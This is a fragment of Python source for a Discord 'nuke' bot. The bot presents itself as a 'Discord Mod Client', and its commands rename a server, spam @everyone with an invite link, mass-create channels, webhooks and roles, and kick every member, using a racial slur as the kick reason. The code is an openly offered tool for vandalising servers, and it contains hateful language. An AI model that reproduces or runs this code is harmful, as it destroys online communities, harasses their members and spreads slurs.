...
channel_names = ['NUKED BY YS', 'NUKED BY YS', 'NUKED BY YS', 'NUKED BY YS', 'NUKED BY YS','NUKED BY YS','NUKED BY YS']
message_spam = ['@everyone https://dsc.gg/ysnuke', '@everyone https://dsc.gg/ysnuke', '@everyone https://dsc.gg/ysnuke', '@everyone https://dsc.gg/ysnuke']
webhook_names = ['NUKED BY YS', 'NUKED BY YS','NUKED BY YS','NUKED BY YS']

###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "Discord Mod Client" ))#change this if you want
  print(f'''
              |══════════════════════════|
              |      __  __  _____       |
              |      \ \ / / / ___|      |
              ...
              |        |_|   |____/      |
              |══════════════════════════|                  
                \x1b[38;5;172mNUKING As {client.user}
                \x1b[38;5;172mVersion: Free Beta v0.2
           \x1b[38;5;172mDISCORD WILL NOW NUKE BY USING !NUKE                
                 ''')

@client.command()
async def nuke(ctx, amount=50):
  await ctx.message.delete()
  await ctx.guild.edit(name="NUKED BY YS")
...
async def kickall(ctx):
  ...
  for member in ctx.guild.members:
    try:
      await member.kick(reason="NIGGA")
...
async def rolespam(ctx):
  ...
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"YS")
